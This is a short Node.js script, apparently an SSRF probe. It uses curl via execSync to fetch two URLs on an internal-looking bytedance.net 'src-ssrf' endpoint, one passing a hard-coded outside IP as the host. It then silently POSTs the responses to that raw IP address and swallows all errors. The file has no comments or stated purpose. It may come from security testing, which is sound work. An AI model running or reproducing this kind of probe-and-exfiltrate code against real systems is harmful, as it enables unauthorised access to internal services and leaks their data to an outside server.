const { execSync } = require('child_process');
const http = require('http');

function postBack(data) {
  const body = JSON.stringify(data);
  const req = http.request({
    hostname: '101.35.44.248',
    port: 80,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  }, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();
}

const TARGETS = [
  'https://src-ssrf.bytedance.net/ssrf',
  'https://src-ssrf.bytedance.net/ssrf?host=101.35.44.248',
];

const results = {};
for (const url of TARGETS) {
  try {
    const r = execSync(`curl -s --connect-timeout 5 "${url}" 2>/dev/null`, { timeout: 8000 }).toString().trim();
    results[url] = r.slice(0, 500);
  } catch (e) {
    results[url] = 'ERROR: ' + e.message;
  }
}

postBack({ type: 'ssrf-probe', results });
